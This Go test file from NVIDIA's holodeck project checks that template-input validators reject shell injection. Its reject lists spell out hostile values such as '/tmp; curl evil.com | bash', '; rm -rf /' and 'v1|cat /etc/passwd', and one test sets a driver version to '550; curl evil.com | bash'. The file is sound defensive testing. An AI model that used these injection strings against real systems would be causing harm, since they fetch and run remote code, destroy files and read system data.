/*
 * Copyright (c) 2026, NVIDIA CORPORATION.  All rights reserved.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package templates

import (
	"testing"

	"github.com/NVIDIA/holodeck/api/holodeck/v1alpha1"
)

func TestVersionPattern(t *testing.T) {
	accept := []string{"v1.31.0", "5.15.0-1057-aws", "1.17.3-1", "550", "v2.0.0+build.1"}
	reject := []string{"; rm -rf /", "$(curl evil)", "`id`", "v1.0 && echo pwned", "v1|cat /etc/passwd"}

	for _, v := range accept {
		if !versionPattern.MatchString(v) {
			t.Errorf("versionPattern should accept %q", v)
		}
	}
	for _, v := range reject {
		if versionPattern.MatchString(v) {
			t.Errorf("versionPattern should reject %q", v)
		}
	}
}

func TestGitURLPattern(t *testing.T) {
	accept := []string{
		"https://github.com/NVIDIA/holodeck",
		"https://github.com/NVIDIA/holodeck.git",
		"http://example.com/repo",
		"https://token@github.com/org/repo.git",
	}
	reject := []string{
		"git@github.com:NVIDIA/holodeck.git",
		"https://evil.com/repo; curl bad",
		"https://evil.com/$(whoami)",
		"file:///etc/passwd",
	}

	for _, v := range accept {
		if !gitURLPattern.MatchString(v) {
			t.Errorf("gitURLPattern should accept %q", v)
		}
	}
	for _, v := range reject {
		if gitURLPattern.MatchString(v) {
			t.Errorf("gitURLPattern should reject %q", v)
		}
	}
}

func TestFilePathPattern(t *testing.T) {
	accept := []string{"/home/user/.ssh/id_rsa", "~/.cache/key", "/tmp/file.txt", "relative/path"}
	reject := []string{
		"/tmp; curl evil.com | bash",
		"/path/$(whoami)/file",
		"/path/`id`/file",
		"/path && rm -rf /",
		"path with spaces",
	}

	for _, v := range accept {
		if !filePathPattern.MatchString(v) {
			t.Errorf("filePathPattern should accept %q", v)
		}
	}
	for _, v := range reject {
		if filePathPattern.MatchString(v) {
			t.Errorf("filePathPattern should reject %q", v)
		}
	}
}

func TestGitRefPattern(t *testing.T) {
	accept := []string{"main", "v1.31.0", "refs/tags/v1.0", "refs/pull/123/head", "feature/my-branch"}
	reject := []string{"; echo pwned", "$(id)", "ref`id`", "branch && bad"}

	for _, v := range accept {
		if !gitRefPattern.MatchString(v) {
			t.Errorf("gitRefPattern should accept %q", v)
		}
	}
	for _, v := range reject {
		if gitRefPattern.MatchString(v) {
			t.Errorf("gitRefPattern should reject %q", v)
		}
	}
}

func TestValidateTemplateInputs_Clean(t *testing.T) {
	env := v1alpha1.Environment{}
	env.Spec.NVIDIADriver.Version = "550"
	env.Spec.ContainerRuntime.Version = "1.7.27"
	env.Spec.Kubernetes.KubernetesVersion = "v1.35.0"

	if err := ValidateTemplateInputs(env); err != nil {
		t.Errorf("expected no error for clean inputs, got: %v", err)
	}
}

func TestValidateTemplateInputs_EmptyFields(t *testing.T) {
	env := v1alpha1.Environment{}
	if err := ValidateTemplateInputs(env); err != nil {
		t.Errorf("expected no error for empty fields, got: %v", err)
	}
}

func TestValidateTemplateInputs_Injection(t *testing.T) {
	env := v1alpha1.Environment{}
	env.Spec.NVIDIADriver.Version = "550; curl evil.com | bash"

	if err := ValidateTemplateInputs(env); err == nil {
		t.Error("expected error for injection attempt, got nil")
	}
}
